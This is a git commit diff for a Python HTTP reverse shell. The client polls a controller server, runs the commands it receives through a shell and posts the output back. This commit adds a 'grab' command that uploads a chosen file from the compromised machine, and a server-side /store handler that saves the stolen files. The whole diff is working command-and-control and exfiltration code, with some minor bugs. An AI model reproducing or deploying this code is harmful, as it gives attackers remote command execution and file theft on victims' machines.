4baeba2780464c4d9a76fd136f1ad37d2d919a2a
LuD1161 <aseemshrey@gmail.com>
2016-11-30 02:40:51 +0530

    Http Server and Client Still Working

--- http_client.py
+++ http_client.py
@@ -1,8 +1,15 @@
 import requests
 import subprocess
 import time
+import os
 
-url = "http://172.26.44.222"
+url = "http://172.26.47.11"
+
+
+def sendPost(Url, data, files=None):
+    response = requests.post(url=Url, proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=data)
+    return response
+
 
 while True:
     req = requests.get(url)
@@ -11,10 +18,18 @@ while True:
     if 'terminate' in command:
         break
 
+    elif 'grab' in command:
+        grab, path = command.split('*')
+        if os.path.exists(path):
+            newUrl = url + '/store'
+            files = {'file': open(path, 'rb')}
+            r = sendPost(url, files=files)
+        else:
+            r = sendPost(url, data='[-]File Not Found')
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        post_response = requests.post(url=url,  proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=CMD.stdout.read())
-        post_response = requests.post(url=url, proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=CMD.stderr.read())
+        post_response = sendPost(url, CMD.stdout.read())
+        post_response = sendPost(url, CMD.stderr.read())
 
     time.sleep(3)
--- http_server.py
+++ http_server.py
@@ -1,4 +1,5 @@
 import BaseHTTPServer
+import os, cgi
 
 HOST_NAME = "172.26.44.222"
 PORT_NUMBER = 80
@@ -13,6 +14,25 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         s.wfile.write(command)
 
     def do_POST(s):
+        if s.path == '/store':
+            try:
+                ctype, blabla = cgi.parse_header(s.headers.getheader('content-type'))
+                if ctype == 'multipart/form-data':
+                    fs = cgi.FieldStorage(fp=s.rfile,
+                                          headers=s.headers,
+                                          environ={'REQUEST_HEADER': 'POST'}
+                                          )
+                else:
+                    print "[-] Unexpected POST Request"
+                fs_up = fs['file']
+                with open('/root/Desktop/1', 'wb') as o:
+                    o.write(fs_up.file.read())
+                    s.send_response(200)
+                    s.end_headers()
+            except Exception as e:
+                print e
+            return
+
         s.send_response(200)
         s.end_headers()
         length = int(s.headers['Content-Length'])
